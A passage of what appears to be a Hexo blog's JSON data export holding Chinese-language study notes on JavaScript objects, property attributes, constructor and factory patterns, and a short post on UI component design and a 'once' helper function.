class=\"hljs-params\">name,age,job</span>)&#123;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>=name;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">age</span>=age;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">job</span>=job;<br><br>    <span class=\"hljs-comment\">//函数模式的缺点，sayName函数会在每个实例中重复一遍，解决方法：讲该函数移到Person外，this.sayName=sayName调用;</span><br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">sayName</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>);<br>    &#125;;<br><br>&#125;<br><br><span class=\"hljs-keyword\">var</span> person1=<span class=\"hljs-title function_\">createPerson</span>(<span class=\"hljs-string\">&quot;Martin&quot;</span>,<span class=\"hljs-number\">18</span>,<span class=\"hljs-string\">&quot;Software enigneer&quot;</span>);<br><span class=\"hljs-keyword\">var</span> person2=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Person</span>(<span class=\"hljs-string\">&quot;Matin&quot;</span>,<span class=\"hljs-number\">20</span>,<span class=\"hljs-string\">&quot;Cyber Security Engineer&quot;</span>);<br><br><br></code></pre></td></tr></table></figure>\n\n<p>6.2.3 原型模式</p>\n<p>好处：可以让所有对象实例共享它包含的属性和方法；（不必在构造函数中定义对象实例的信息，而是将这些信息直接添加到原型对象中）</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"CH6\"><a href=\"#CH6\" class=\"headerlink\" title=\"CH6\"></a>CH6</h1><h3 id=\"6-1-对象\"><a href=\"#6-1-对象\" class=\"headerlink\" title=\"6.1 对象\"></a>6.1 对象</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">//eailer</span><br><span class=\"hljs-keyword\">var</span> person=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Object</span>();<br>person.<span class=\"hljs-property\">name</span>=<span class=\"hljs-string\">&quot;Martin&quot;</span>;<br>person.<span class=\"hljs-property\">age</span>=<span class=\"hljs-number\">18</span>;<br>person.<span class=\"hljs-property\">job</span>=<span class=\"hljs-string\">&quot;Student&quot;</span>;<br><br>person.<span class=\"hljs-property\">sayName</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-title function_\">alert</span>(person.<span class=\"hljs-property\">name</span>);<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(person.<span class=\"hljs-property\">name</span>);<br>&#125;;<br><br>person.<span class=\"hljs-property\">sayAge</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-title function_\">alert</span>(person.<span class=\"hljs-property\">age</span>);<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(person.<span class=\"hljs-property\">age</span>);<br>&#125;;<br><br>person.<span class=\"hljs-property\">sayJob</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-title function_\">alert</span>(person.<span class=\"hljs-property\">job</span>);<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(person.<span class=\"hljs-property\">job</span>);<br>&#125;;<br><br><br><span class=\"hljs-comment\">//Face to object</span><br><span class=\"hljs-keyword\">var</span> person1=&#123;<br>    <span class=\"hljs-attr\">name</span>:<span class=\"hljs-string\">&quot;Jack&quot;</span>,<br>    <span class=\"hljs-attr\">age</span>:<span class=\"hljs-number\">21</span>,<br>    <span class=\"hljs-attr\">job</span>:<span class=\"hljs-string\">&quot;Software Engineer.&quot;</span>,<br><br>    <span class=\"hljs-attr\">sayName</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>);<br>    &#125;,<br>    <span class=\"hljs-attr\">sayAge</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">age</span>);<br>    &#125;,<br>    <span class=\"hljs-attr\">sayJob</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">job</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"6-1-1-属性类型：数据属性和访问器属性\"><a href=\"#6-1-1-属性类型：数据属性和访问器属性\" class=\"headerlink\" title=\"6.1.1 属性类型：数据属性和访问器属性\"></a>6.1.1 属性类型：数据属性和访问器属性</h4><h5 id=\"（1）数据属性：\"><a href=\"#（1）数据属性：\" class=\"headerlink\" title=\"（1）数据属性：\"></a>（1）数据属性：</h5><p>​        Configurable:表示能否通过delete删除属性从而重新定义属性；修改特性；修改为访问器属性；注：直接在对象上定义的属性，默认值为true；</p>\n<p>​        Enumerable：表示能否通过for-in循环返回属性；注：直接在对象上定义的属性，默认值为true；</p>\n<p>​        Writable：表示能否修改属性得值；注：直接在对象上定义的属性，默认值为true；</p>\n<p>​        Value：属性的数据值；默认为undefined；</p>\n<p>使用Object.defineProperty()方法修稿属性默认得特性；三个参数：属性所在的对象，属性名，描述符对象（以上四个数据属性）；</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><br><span class=\"hljs-keyword\">var</span> person2=&#123;&#125;;<br><span class=\"hljs-title class_\">Object</span>.<span class=\"hljs-title function_\">defineProperty</span>(person2,<span class=\"hljs-string\">&quot;name&quot;</span>,&#123;<br>    <span class=\"hljs-title class_\">Writable</span>:<span class=\"hljs-literal\">false</span>,<br>    <span class=\"hljs-attr\">value</span>:<span class=\"hljs-string\">&quot;Jack&quot;</span><br>&#125;);<br><br><span class=\"hljs-title function_\">alert</span>(person2.<span class=\"hljs-property\">name</span>);<br>person1.<span class=\"hljs-property\">name</span>=<span class=\"hljs-string\">&quot;Nancy&quot;</span>;<br><span class=\"hljs-title function_\">alert</span>(person2.<span class=\"hljs-property\">name</span>);<br><br><span class=\"hljs-comment\">//输出结果为Jack；非严格模式下，赋值被忽略；严格模式下，抛出错误；</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"（2）访问器属性：\"><a href=\"#（2）访问器属性：\" class=\"headerlink\" title=\"（2）访问器属性：\"></a>（2）访问器属性：</h5><p>​        Configurable:表示能否通过delete删除属性从而重新定义属性；修改特性；修改为访问器属性；注：直接在对象上定义的属性，默认值为true；</p>\n<p>​        Enumerable：表示能否通过for-in循环返回属性；注：直接在对象上定义的属性，默认值为true；        </p>\n<p>​        Get：读取属性时调用的函数，默认为undefined；</p>\n<p>​        Set：写入属性时使用，默认为undefined；</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">//访问器属性实例</span><br><span class=\"hljs-keyword\">var</span> book=&#123;<br>    <span class=\"hljs-attr\">_year</span>:<span class=\"hljs-number\">2021</span>,<br>    <span class=\"hljs-attr\">edition</span>:<span class=\"hljs-number\">1</span><br>&#125;;<br><span class=\"hljs-title class_\">Object</span>.<span class=\"hljs-title function_\">defineProperty</span>(book,<span class=\"hljs-string\">&quot;year&quot;</span>,&#123;<br>    <span class=\"hljs-attr\">get</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">_year</span>;<br>    &#125;,<br>    <span class=\"hljs-attr\">set</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">newValue</span>)&#123;<br>        <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">_year</span>=newValue;<br>        <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">edition</span>+=newValue-<span class=\"hljs-number\">2021</span>;<br>    &#125;<br>&#125;);<br><br>book.<span class=\"hljs-property\">year</span>=<span class=\"hljs-number\">2023</span>;<br><span class=\"hljs-title function_\">alert</span>(book.<span class=\"hljs-property\">edition</span>);<br></code></pre></td></tr></table></figure>\n\n<p>6.1.2 定义多个属性：Object.defineproperties()方法</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">var</span> book = &#123;&#125;;<br><span class=\"hljs-title class_\">Object</span>.<span class=\"hljs-title function_\">defineProperties</span>(book, &#123;<br>    <span class=\"hljs-attr\">_year</span>: &#123;<br>        <span class=\"hljs-attr\">writable</span>: <span class=\"hljs-literal\">true</span>,<br>        <span class=\"hljs-attr\">value</span>: <span class=\"hljs-number\">2020</span><br>    &#125;,<br>    <span class=\"hljs-attr\">edition</span>: &#123;<br>        <span class=\"hljs-attr\">writable</span>: <span class=\"hljs-literal\">true</span>,<br>        <span class=\"hljs-attr\">value</span>: <span class=\"hljs-number\">1</span><br>    &#125;,<br>    <span class=\"hljs-attr\">year</span>: &#123;<br>        <span class=\"hljs-attr\">get</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) &#123;<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">_year</span>;<br>        &#125;,<br>        <span class=\"hljs-attr\">set</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">newValue</span>) &#123;<br>            <span class=\"hljs-keyword\">if</span> (newValue &gt; <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">_year</span>) &#123;<br>                <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">_year</span> = newValue;<br>                <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">edition</span> += newValue - <span class=\"hljs-number\">2020</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;)<br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-2创建对象\"><a href=\"#6-2创建对象\" class=\"headerlink\" title=\"6.2创建对象\"></a>6.2创建对象</h3><h4 id=\"6-2-1工厂模式\"><a href=\"#6-2-1工厂模式\" class=\"headerlink\" title=\"6.2.1工厂模式\"></a>6.2.1工厂模式</h4><p>​    解决了创建对象的问题但是没有解决对象识别的问题；</p>\n<h4 id=\"6-2-2构造函数模式\"><a href=\"#6-2-2构造函数模式\" class=\"headerlink\" title=\"6.2.2构造函数模式\"></a>6.2.2构造函数模式</h4><p>​    （1）创建一个新对象；</p>\n<p>​    （2）将函数得作用域赋值给对象；</p>\n<p>​    （3）执行构造函数得代码，为对象添加属性；</p>\n<p>​    （4）返回新对象；</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><br><span class=\"hljs-comment\">//工厂模式方法</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">createPerson</span>(<span class=\"hljs-params\">name,age,job</span>)&#123;<br>    <span class=\"hljs-keyword\">var</span> o=<span class=\"hljs-title class_\">Object</span>();<br>    o.<span class=\"hljs-property\">name</span>=name;<br>    o.<span class=\"hljs-property\">age</span>=age;<br>    o.<span class=\"hljs-property\">job</span>=job;<br>    o.<span class=\"hljs-property\">sayHi</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-title function_\">alert</span>(o.<span class=\"hljs-property\">name</span>);<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span> o;<br>&#125;<br><br><span class=\"hljs-comment\">//构造函数方法模式</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Person</span>(<span class=\"hljs-params\">name,age,job</span>)&#123;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>=name;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">age</span>=age;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">job</span>=job;<br><br>    <span class=\"hljs-comment\">//函数模式的缺点，sayName函数会在每个实例中重复一遍，解决方法：讲该函数移到Person外，this.sayName=sayName调用;</span><br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">sayName</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>);<br>    &#125;;<br><br>&#125;<br><br><span class=\"hljs-keyword\">var</span> person1=<span class=\"hljs-title function_\">createPerson</span>(<span class=\"hljs-string\">&quot;Martin&quot;</span>,<span class=\"hljs-number\">18</span>,<span class=\"hljs-string\">&quot;Software enigneer&quot;</span>);<br><span class=\"hljs-keyword\">var</span> person2=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Person</span>(<span class=\"hljs-string\">&quot;Matin&quot;</span>,<span class=\"hljs-number\">20</span>,<span class=\"hljs-string\">&quot;Cyber Security Engineer&quot;</span>);<br><br><br></code></pre></td></tr></table></figure>\n\n<p>6.2.3 原型模式</p>\n<p>好处：可以让所有对象实例共享它包含的属性和方法；（不必在构造函数中定义对象实例的信息，而是将这些信息直接添加到原型对象中）</p>\n"},{"title":"Vue笔记","date":"2022-10-11T18:51:45.000Z","mp3":null,"cover":"img/vue.png","_content":"\n# JS\n\n## 一、各司其职\n\n> HTML、CSS、JS职能分离\n\n![](https://s3.bmp.ovh/imgs/2023/01/17/f3f6568ed1415a07.jpg)\n\n\n\n## 二、组件封装\n\n> 好的UI组件具有正确性、拓展性、复用性\n\n### 1.结构\n\n轮播图其实是一个列表结构；\n\n通过css将图片层叠在一起；\n\n### 2.展现效果\n\n### 3.行为\n\nAPI 功能\n\nEvent 控制流：使用自定义的事件来解耦\n\n### 4.改进空间\n\n- 解耦+\n\n\n\n\n\n## 三、过程抽象\n\n> 应用函数时编程思想\n\n- 用来处理局部细节控制的方法\n- 函数式编程思想的基础应用\n\n1.once\n\n一个方法设置了timewaite以后，如果在time内多次激活方法会报错，这个时候需要用once方法来禁止多次调用。\n\n```js\nbuttons.forEach((button)=>{\n    button.addEventListener('click',once((evt)=>{\n        const target=evt.target;\n        setTimeout(()=>{\n            list.removeChild(target);\n        },2000)\t\t\t\t//设置2000ms\n    })，{once:true})；\t\t//仅允许调用一次；\n})；\n```\n\n```js\n//once function的实现\n\nfunction once(fn){\n    //外部闭包\n    return function(...args){\n        //内部闭包\n        if(fn){\n            const ret=fn.apply(this,args);\n            fn=null;\n            return ret;\n        }\n    }\n}\n```\n\n为了能够让”只执行一次“的需求覆盖不同的事件处理，我们可以将这个需求剥离出来。这个过程，我们成为**过程抽象**\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/JS.md","raw":"---\ntitle: Vue笔记\ndate: 2022-10-12 2:51:45\ncategories: \n    - 前端\ntags: \n    - JS\n    - 笔记\nmp3: \ncover: img/vue.png\n---\n\n# JS\n\n## 一、各司其职\n\n> HTML、CSS、JS职能分离\n\n![](https://s3.bmp.ovh/imgs/2023/01/17/f3f6568ed1415a07.jpg)\n\n\n\n## 二、组件封装\n\n> 好的UI组件具有正确性、拓展性、复用性\n\n### 1.结构\n\n轮播图其实是一个列表结构；\n\n通过css将图片层叠在一起；\n\n### 2.展现效果\n\n### 3.行为\n\nAPI 功能\n\nEvent 控制流：使用自定义的事件来解耦\n\n### 4.改进空间\n\n- 解耦+\n\n\n\n\n\n## 三、过程抽象\n\n> 应用函数时编程思想\n\n- 用来处理局部细节控制的方法\n- 函数式编程思想的基础应用\n\n1.once\n\n一个方法设置了timewaite以后，如果在time内多次激活方法会报错，这个时候需要用once方法来禁止多次调用。\n\n```js\nbuttons.forEach((button)=>{\n    button.addEventListener('click',once((evt)=>{\n        const target=evt.target;\n        setTimeout(()=>{\n            list.removeChild(target);\n        },2000)\t\t\t\t//设置2000ms\n    })，{once:true})；\t\t//仅允许调用一次；\n})；\n```\n\n```js\n//once function的实现\n\nfunction once(fn){\n    //外部闭包\n    return function(...args){\n        //内部闭包\n        if(fn){\n            const ret=fn.apply(this,args);\n            fn=null;\n            return ret;\n        }\n    }\n}\n```\n\n为了能够让”只执行一次“的需求覆盖不同的事件处理，我们可以将这个需求剥离出来。这个过程，我们成为**过程抽象**\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"JS","published":1,"updated":"2023-04-04T13:35:28.254Z","_id":"clg29vyg50015ao9c35zo34u3","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"JS\"><a href=\"#JS\" class=\"headerlink\" title=\"JS\"></a>JS</h1><h2 id=\"一、各司其职\"><a href=\"#一、各司其职\" class=\"headerlink\" title=\"一、各司其职\"></a>一、各司其职</h2><blockquote>\n<p>HTML、CSS、JS职能分离</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/01/17/f3f6568ed1415a07.jpg\"></p>\n<h2 id=\"二、组件封装\"><a href=\"#二、组件封装\" class=\"headerlink\" title=\"二、组件封装\"></a>二、组件封装</h2><blockquote>\n<p>好的UI组件具有正确性、拓展性、复用性</p>\n</blockquote>\n<h3 id=\"1-结构\"><a href=\"#1-结构\" class=\"headerlink\" title=\"1.结构\"></a>1.结构</h3><p>轮播图其实是一个列表结构；</p>\n<p>通过css将图片层叠在一起；</p>\n<h3 id=\"2-展现效果\"><a href=\"#2-展现效果\" class=\"headerlink\" title=\"2.展现效果\"></a>2.展现效果</h3><h3 id=\"3-行为\"><a href=\"#3-行为\" class=\"headerlink\" title=\"3.行为\"></a>3.行为</h3><p>API 功能</p>\n<p>Event 控制流：使用自定义的事件来解耦</p>\n<h3 id=\"4-改进空间\"><a href=\"#4-改进空间\" class=\"headerlink\" title=\"4.改进空间\"></a>4.改进空间</h3><ul>\n<li>解耦+</li>\n</ul>\n<h2 id=\"三、过程抽象\"><a href=\"#三、过程抽象\" class=\"headerlink\" title=\"三、过程抽象\"></a>三、过程抽象</h2><blockquote>\n<p>应用函数时编程思想</p>\n</blockquote>\n<ul>\n<li>用来处理局部细节控制的方法</li>\n<li>函数式编程思想的基础应用</li>\n</ul>\n<p>1.once</p>\n<p>一个方法设置了timewaite以后，如果在time内多次激活方法会报错，这个时候需要用once方法来禁止多次调用。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">buttons.<span class=\"hljs-title function_\">forEach</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">button</span>)=&gt;</span>&#123;<br>    button.<span class=\"hljs-title function_\">addEventListener</span>(<span class=\"hljs-string\">&#x27;click&#x27;</span>,<span class=\"hljs-title function_\">once</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">evt</span>)=&gt;</span>&#123;<br>        <span class=\"hljs-keyword\">const</span> target=evt.<span class=\"hljs-property\">target</span>;<br>        <span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>            list.<span class=\"hljs-title function_\">removeChild</span>(target);<br>        &#125;,<span class=\"hljs-number\">2000</span>)\t\t\t\t<span class=\"hljs-comment\">//设置2000ms</span><br>    &#125;)，&#123;<span class=\"hljs-attr\">once</span>:<span class=\"hljs-literal\">true</span>&#125;)；\t\t<span class=\"hljs-comment\">//仅允许调用一次；</span><br>&#125;)；<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//once function的实现</span><br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">once</span>(<span class=\"hljs-params\">fn</span>)&#123;<br>    <span class=\"hljs-comment\">//外部闭包</span><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">...args</span>)&#123;<br>        <span class=\"hljs-comment\">//内部闭包</span><br>        <span class=\"hljs-keyword\">if</span>(fn)&#123;<br>            <span class=\"hljs-keyword\">const</span> ret=fn.<span class=\"hljs-title function_\">apply</span>(<span class=\"hljs-variable language_\">this</span>,args);<br>            fn=<span class=\"hljs-literal\">null</span>;<br>            <span class=\"hljs-keyword\">return</span> ret;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>为了能够让”只执行一次“的需求覆盖不同的事件处理，我们可以将这个需求剥离出来。这个过程，我们成为<strong>过程抽象</strong></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"JS\"><a href=\"#JS\" class=\"headerlink\" title=\"JS\"></a>JS</h1><h2 id=\"一、各司其职\"><a href=\"#一、各司其职\" class=\"headerlink\" title=\"一、各司其职\"></a>一、各司其职</h2><blockquote>\n<p>HTML、CSS、JS职能分离</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/01/17/f3f6568ed1415a07.jpg\"></p>\n<h2 id=\"二、组件封装\"><a href=\"#二、组件封装\" class=\"headerlink\" title=\"二、组件封装\"></a>二、组件封装</h2><blockquote>\n<p>好的UI组件具有正确性、拓展性、复用性</p>\n</blockquote>\n<h3 id=\"1-结构\"><a href=\"#1-结构\" class=\"headerlink\" title=\"1.结构\"></a>1.结构</h3><p>轮播图其实是一个列表结构；</p>\n<p>通过css将图片层叠在一起；</p>\n<h3 id=\"2-展现效果\"><a href=\"#2-展现效果\" class=\"headerlink\" title=\"2.展现效果\"></a>2.展现效果</h3><h3 id=\"3-行为\"><a href=\"#3-行为\" class=\"headerlink\" title=\"3.行为\"></a>3.行为</h3><p>API 功能</p>\n<p>Event 控制流：使用自定义的事件来解耦</p>\n<h3 id=\"4-改进空间\"><a href=\"#4-改进空间\" class=\"headerlink\" title=\"4.改进空间\"></a>4.改进空间</h3><ul>\n<li>解耦+</li>\n</ul>\n<h2 id=\"三、过程抽象\"><a href=\"#三、过程抽象\" class=\"headerlink\" title=\"三、过程抽象\"></a>三、过程抽象</h2><blockquote>\n<p>应用函数时编程思想</p>\n</blockquote>\n<ul>\n<li>用来处理局部细节控制的方法</li>\n<li>函数式编程思想的基础应用</li>\n</ul>\n<p>1.once</p>\n<p>一个方法设置了timewaite以后，如果在time内多次激活方法会报错，这个时候需要用once方法来禁止多次调用。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">buttons.<span class=\"hljs-title function_\">forEach</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">button</span>)=&gt;</span>&#123;<br>    button.<span class=\"hljs-title function_\">addEventListener</span>(<span class=\"hljs-string\">&#x27;click&#x27;</span>,<span class=\"hljs-title function_\">once</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">evt</span>)=&gt;</span>&#123;<br>        <span class=\"hljs-keyword\">const</span> target=evt.<span class=\"hljs-property\">target</span>;<br>        <span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>            list.<span class=\"hljs-title function_\">removeChild</span>(target);<br>        &#125;,<span class=\"hljs-number\">2000</span>)\t\t\t\t<span class=\"hljs-comment\">//设置2000ms</span><br>    &#125;)，&#123;<span class=\"hljs-attr\">once</span>:<span class=\"hljs-literal\">true</span>&#125;)；\t\t<span class=\"hljs-comment\">//仅允许调用一次；</span><br>&#125;)；<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//once function的实现</span><br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">once</span>(<span class=\"hljs-params\">fn</span>)&#123;<br>    <span class=\"hljs-comment\">//外部闭包</span><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">...args</span>)&#123;<br>        <span class=\"hljs-comment\">//内部闭包</span><br>        <span class=\"hljs-keyword\">if</span>(fn)&#123;<br>            <span class=\"hljs-keyword\">const</span> ret=fn.<span class=\"hljs-title function_\">apply</span>(<span class=\"hljs-variable language_\">this</span>,args);<br>            fn=<span class=\"hljs-literal\">null</span>;<br>            <span class=\"hljs-keyword\">return</span> ret;<br>        &#125;<br>    